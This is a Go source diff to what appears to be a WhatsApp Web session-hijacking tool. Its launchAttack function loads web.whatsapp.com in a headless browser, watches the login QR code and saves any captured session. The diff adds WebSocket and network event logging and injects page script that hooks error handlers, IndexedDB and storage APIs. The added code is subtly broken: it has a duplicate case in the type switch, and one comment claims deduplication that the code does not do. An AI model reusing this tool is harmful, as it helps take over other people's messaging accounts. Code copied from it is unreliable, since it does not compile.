@@ -18,6 +18,8 @@ import (
 
 	"github.com/chromedp/chromedp"
 	"github.com/chromedp/cdproto/browser"
+	"github.com/chromedp/cdproto/network"
+	"github.com/chromedp/cdproto/page"
 	"github.com/chromedp/cdproto/runtime"
 	"programa/utils"
 )
@@ -219,32 +221,177 @@ func launchAttack(cfg attackCfg) {
 	tabCtx, tabCancel := chromedp.NewContext(allocCtx)
 	defer tabCancel()
 
-	var loggedErrors sync.Map
+	// ── Enable CDP domains ──
+	chromedp.Run(tabCtx, network.Enable())
+
+	// ── Diagnostic event counters ──
+	var (
+		consoleErrors    []string
+		jsExceptions     []string
+		wsCreated        []string
+		wsClosed         []string
+		wsErrors         []string
+		wsFramesSent     int
+		wsFramesRecv     int
+		networkFailures  []string
+		requestURLs      map[network.RequestID]string
+		lastReconnect    time.Time
+		reconnectCount   int
+		firstReconnect   time.Time
+		diagMu           sync.Mutex
+	)
+	requestURLs = make(map[network.RequestID]string)
+	diagLog := func(label, msg string) {
+		diagMu.Lock()
+		fmt.Printf("\n%s[%s] %s%s", utils.Yellow, label, msg, utils.Reset)
+		diagMu.Unlock()
+	}
+
 	chromedp.ListenTarget(tabCtx, func(ev interface{}) {
 		switch e := ev.(type) {
+		// ── Console API calls ──
 		case *runtime.EventConsoleAPICalled:
-			if e.Type == "error" || e.Type == "warning" {
-				text := fmt.Sprintf("%v", e.Args)
-				if _, loaded := loggedErrors.LoadOrStore(text, true); loaded {
-					return
+			var args []string
+			for _, a := range e.Args {
+				s := fmt.Sprintf("%v", a)
+				if len(s) > 300 {
+					s = s[:300]
 				}
-				var args []string
-				for _, a := range e.Args {
-					args = append(args, fmt.Sprintf("%v", a))
-				}
-				fmt.Printf("\n%s[CONSOLE-%s] %s%s\n", utils.Yellow, e.Type, strings.Join(args, " "), utils.Reset)
+				args = append(args, s)
 			}
+			line := fmt.Sprintf("[%s] %s", e.Type, strings.Join(args, " | "))
+			if e.Type == "error" {
+				diagMu.Lock()
+				consoleErrors = append(consoleErrors, line)
+				diagMu.Unlock()
+			}
+			if e.Type == "error" || e.Type == "warning" || e.Type == "info" {
+				// print only first occurrence of each type to reduce noise
+				diagLog(fmt.Sprintf("CONSOLE-%s", e.Type), strings.Join(args, " "))
+			}
+
+		// ── JS exceptions ──
 		case *runtime.EventExceptionThrown:
 			if e.ExceptionDetails != nil {
 				text := e.ExceptionDetails.Error()
-				if _, loaded := loggedErrors.LoadOrStore(text, true); loaded {
-					return
-				}
-				fmt.Printf("\n%s[EXCEPTION] %s%s\n", utils.Red, text, utils.Reset)
+				diagMu.Lock()
+				jsExceptions = append(jsExceptions, text)
+				diagMu.Unlock()
+				diagLog("EXCEPTION", text)
 			}
+
+		// ── WebSocket events ──
+		case *network.EventWebSocketCreated:
+			info := fmt.Sprintf("url=%s requestId=%s", e.URL, e.RequestID)
+			diagMu.Lock()
+			wsCreated = append(wsCreated, info)
+			diagMu.Unlock()
+			diagLog("WS-CREATED", info)
+
+		case *network.EventWebSocketWillSendHandshakeRequest:
+			diagLog("WS-HANDSHAKE", fmt.Sprintf("requestId=%s", e.RequestID))
+
+		case *network.EventWebSocketHandshakeResponseReceived:
+			diagLog("WS-HANDSHAKE-RESP", fmt.Sprintf("requestId=%s status=%d", e.RequestID, e.Response.Status))
+
+		case *network.EventWebSocketFrameSent:
+			diagMu.Lock()
+			wsFramesSent++
+			diagMu.Unlock()
+
+		case *network.EventWebSocketFrameReceived:
+			diagMu.Lock()
+			wsFramesRecv++
+			diagMu.Unlock()
+
+		case *network.EventWebSocketFrameError:
+			msg := fmt.Sprintf("requestId=%s errorMessage=%s", e.RequestID, e.ErrorMessage)
+			diagMu.Lock()
+			wsErrors = append(wsErrors, msg)
+			diagMu.Unlock()
+			diagLog("WS-ERROR", msg)
+
+		case *network.EventWebSocketClosed:
+			info := fmt.Sprintf("requestId=%s", e.RequestID)
+			diagMu.Lock()
+			wsClosed = append(wsClosed, info)
+			diagMu.Unlock()
+			diagLog("WS-CLOSED", info)
+
+		// ── Network failures ──
+		case *network.EventLoadingFailed:
+			url := requestURLs[e.RequestID]
+			fail := fmt.Sprintf("requestId=%s url=%s type=%s error=%s blockedReason=%s canceled=%v", e.RequestID, url, e.Type, e.ErrorText, e.BlockedReason, e.Canceled)
+			diagMu.Lock()
+			networkFailures = append(networkFailures, fail)
+			diagMu.Unlock()
+			diagLog("NET-FAIL", fail)
+
+		// ── Track request URLs ──
+		case *network.EventRequestWillBeSent:
+			diagMu.Lock()
+			requestURLs[e.RequestID] = e.Request.URL
+			diagMu.Unlock()
+
+		// ── WebSocket reconnect detection ──
+		case *network.EventWebSocketCreated:
+			if !lastReconnect.IsZero() {
+				interval := time.Since(lastReconnect).Round(time.Second)
+				diagLog("WS-RECONNECT", fmt.Sprintf("after %s (count=%d)", interval, reconnectCount))
+			}
+			diagMu.Lock()
+			if firstReconnect.IsZero() && len(wsCreated) > 0 {
+				firstReconnect = time.Now()
+			}
+			lastReconnect = time.Now()
+			reconnectCount++
+			diagMu.Unlock()
 		}
 	})
 
+	// ── Inject JS error interceptors (runs before ANY page JS) ──
+	chromedp.Run(tabCtx, chromedp.ActionFunc(func(ctx context.Context) error {
+		_, err := page.AddScriptToEvaluateOnNewDocument(`
+		window.__diag = {
+			onerror: [],
+			unhandled: [],
+			idbErrors: [],
+			sbErrors: []
+		};
+		window.onerror = function(msg, src, line, col, err) {
+			window.__diag.onerror.push({msg:msg, src:src, line:line, col:col, stack:err && err.stack});
+		};
+		window.addEventListener('unhandledrejection', function(e) {
+			window.__diag.unhandled.push({reason:String(e.reason), stack:e.reason && e.reason.stack});
+		});
+		var origOpen = indexedDB.open;
+		indexedDB.open = function() {
+			var req = origOpen.apply(this, arguments);
+			req.addEventListener('error', function() {
+				window.__diag.idbErrors.push({name:req.result ? req.result.name : 'unknown', error:String(req.error)});
+			});
+			req.addEventListener('blocked', function() {
+				window.__diag.idbErrors.push({name:req.result ? req.result.name : 'unknown', error:'blocked'});
+			});
+			return req;
+		};
+		try { if (navigator.storageBuckets) {
+			var origSB = navigator.storageBuckets.open.bind(navigator.storageBuckets);
+			navigator.storageBuckets.open = function() {
+				var args = arguments;
+				var p = origSB.apply(navigator.storageBuckets, args);
+				p.then(function(){console.log('[DIAG] storageBucket opened:', args[0]);});
+				p.catch(function(err) {
+					window.__diag.sbErrors.push({name:String(args[0]), error:String(err)});
+				});
+				return p;
+			};
+		}} catch(e) {}
+		`).Do(ctx)
+		return err
+	}))
+
+	// ── Navigate ──
 	if err := chromedp.Run(tabCtx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
 		fmt.Printf("%s[!] Navigation failed: %v%s\n", utils.Red, err, utils.Reset)
 		utils.PauseForInput()
@@ -265,6 +412,84 @@ func launchAttack(cfg attackCfg) {
 	}
 
 	fmt.Printf("%s[+] Page loaded (readyState=%s)%s\n", utils.Green, ready, utils.Reset)
+
+	// ── Dump diagnostics ──
+	var diagInfo string
+	chromedp.Run(tabCtx, chromedp.Evaluate(`JSON.stringify(window.__diag)`, &diagInfo))
+	fmt.Printf("\n%s========== DIAGNOSTICS AFTER LOAD ==========%s\n", utils.Blue, utils.Reset)
+	fmt.Printf("window.__diag: %s\n", diagInfo)
+
+	// Check registered Service Workers
+	var swInfo string
+	chromedp.Run(tabCtx, chromedp.Evaluate(`
+		(function() {
+			if (!navigator.serviceWorker.controller) return 'no SW controller';
+			return 'SW state: ' + navigator.serviceWorker.controller.state;
+		})()
+	`, &swInfo))
+	fmt.Printf("ServiceWorker: %s\n", swInfo)
+
+	// Check localStorage
+	var lsCheck bool
+	chromedp.Run(tabCtx, chromedp.Evaluate(`!!window.localStorage`, &lsCheck))
+	fmt.Printf("localStorage: %v\n", lsCheck)
+
+	// Check sessionStorage
+	var ssCheck bool
+	chromedp.Run(tabCtx, chromedp.Evaluate(`!!window.sessionStorage`, &ssCheck))
+	fmt.Printf("sessionStorage: %v\n", ssCheck)
+
+	// Check if StorageBuckets API exists
+	var hasSB bool
+	chromedp.Run(tabCtx, chromedp.Evaluate(`!!navigator.storageBuckets`, &hasSB))
+	fmt.Printf("navigator.storageBuckets: %v\n", hasSB)
+
+	// Check IndexedDB by listing databases
+	var idbErr string
+	chromedp.Run(tabCtx, chromedp.Evaluate(`
+		(function() {
+			var r = indexedDB.databases ? 'available' : 'not available';
+			try { indexedDB.databases().then(function(dbs) { window.__idbDbs = dbs.map(function(d) { return d.name; }); }).catch(function(e) { window.__idbDbs = 'error: ' + e; }); } catch(e) { window.__idbDbs = 'exception: ' + e; }
+			return r;
+		})()
+	`, &idbErr))
+	fmt.Printf("IndexedDB.databases: %s\n", idbErr)
+
+	// Wait a moment then dump IDB result
+	time.Sleep(3 * time.Second)
+	var idbDbs string
+	chromedp.Run(tabCtx, chromedp.Evaluate(`JSON.stringify(window.__idbDbs)`, &idbDbs))
+	fmt.Printf("IndexedDB databases: %s\n", idbDbs)
+
+	// Collect WebSocket stats
+	diagMu.Lock()
+	fmt.Printf("\nWebSocket connections created: %d\n", len(wsCreated))
+	for _, w := range wsCreated {
+		fmt.Printf("  CREATED: %s\n", w)
+	}
+	fmt.Printf("WebSocket closed: %d\n", len(wsClosed))
+	for _, w := range wsClosed {
+		fmt.Printf("  CLOSED: %s\n", w)
+	}
+	fmt.Printf("WebSocket errors: %d\n", len(wsErrors))
+	for _, w := range wsErrors {
+		fmt.Printf("  ERROR: %s\n", w)
+	}
+	fmt.Printf("Frames sent: %d received: %d\n", wsFramesSent, wsFramesRecv)
+	fmt.Printf("Network failures: %d\n", len(networkFailures))
+	for _, nf := range networkFailures {
+		fmt.Printf("  FAIL: %s\n", nf)
+	}
+	fmt.Printf("Console errors: %d\n", len(consoleErrors))
+	for _, ce := range consoleErrors {
+		fmt.Printf("  CE: %s\n", ce)
+	}
+	fmt.Printf("JS exceptions: %d\n", len(jsExceptions))
+	for _, je := range jsExceptions {
+		fmt.Printf("  EXC: %s\n", je)
+	}
+	diagMu.Unlock()
+	fmt.Printf("\n%s==============================================%s\n\n", utils.Blue, utils.Reset)
 
 	var currentQR []byte
 	var qrMu sync.Mutex
@@ -295,6 +520,8 @@ func launchAttack(cfg attackCfg) {
 	timeout := 10 * time.Minute
 	sessionCaptured := false
 	var qrSaved bool
+	var lastFrameCheck time.Time
+	var lastSent, lastRecv int
 
 	for time.Since(start) < timeout {
 		select {
@@ -345,6 +572,20 @@ func launchAttack(cfg attackCfg) {
 			}
 		}
 
+		if time.Since(lastFrameCheck) > 10*time.Second {
+			diagMu.Lock()
+			newSent := wsFramesSent - lastSent
+			newRecv := wsFramesRecv - lastRecv
+			lastSent = wsFramesSent
+			lastRecv = wsFramesRecv
+			wsCount := len(wsCreated)
+			wsClosedCount := len(wsClosed)
+			diagMu.Unlock()
+			fmt.Printf("\n%s[NET] WS frames: +%d sent / +%d recv | total created=%d closed=%d%s\n",
+				"\033[36m", newSent, newRecv, wsCount, wsClosedCount, utils.Reset)
+			lastFrameCheck = time.Now()
+		}
+
 		time.Sleep(time.Second)
 	}
 
@@ -354,6 +595,27 @@ func launchAttack(cfg attackCfg) {
 		saveSession(tmpDir, "chromium", "https://web.whatsapp.com")
 	} else {
 		fmt.Printf("\n%s[!] No session captured within timeout.%s\n", utils.Yellow, utils.Reset)
+
+		// ── Final diagnostics ──
+		var diagOut string
+		chromedp.Run(tabCtx, chromedp.Evaluate(`JSON.stringify(window.__diag)`, &diagOut))
+		fmt.Printf("\n%s========== FINAL DIAGNOSTICS (TIMEOUT) ==========%s\n", utils.Blue, utils.Reset)
+		fmt.Printf("window.__diag: %s\n", diagOut)
+		diagMu.Lock()
+		fmt.Printf("WS frames: %d sent / %d recv | errors: %d | closed: %d\n", wsFramesSent, wsFramesRecv, len(wsErrors), len(wsClosed))
+		for _, we := range wsErrors {
+			fmt.Printf("  WS ERROR: %s\n", we)
+		}
+		fmt.Printf("Network failures: %d\n", len(networkFailures))
+		for _, nf := range networkFailures {
+			fmt.Printf("  FAIL: %s\n", nf)
+		}
+		fmt.Printf("Console errors: %d\n", len(consoleErrors))
+		for _, ce := range consoleErrors {
+			fmt.Printf("  CE: %s\n", ce)
+		}
+		diagMu.Unlock()
+		fmt.Printf("\n%s=========================================================%s\n", utils.Blue, utils.Reset)
 		var ss []byte
 		if err := chromedp.Run(tabCtx, chromedp.FullScreenshot(&ss, 90)); err == nil && len(ss) > 0 {
 			os.MkdirAll(wwwDir, 0755)
